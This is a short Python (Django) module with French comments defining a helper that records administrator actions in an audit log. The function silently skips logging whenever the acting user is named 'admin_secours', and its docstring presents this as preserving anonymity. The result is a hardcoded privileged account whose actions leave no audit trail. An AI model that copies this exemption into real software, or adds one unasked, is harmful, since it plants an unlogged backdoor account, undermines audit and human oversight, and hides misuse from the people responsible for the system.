from .models import LogAction


def log_action(admin_user, action, details, entite_id=None):
    """Crée une entrée dans le journal d'audit.
    Pour l'utilisateur spécial 'admin_secours', aucune entrée n'est créée afin de préserver l'anonymat.
    """
    if getattr(admin_user, 'username', None) == 'admin_secours':
        # Ne pas enregistrer d'action pour cet admin spécial
        return
    LogAction.objects.create(
        action=action,
        details=details,
        entite_id=entite_id,
        admin=admin_user
    )
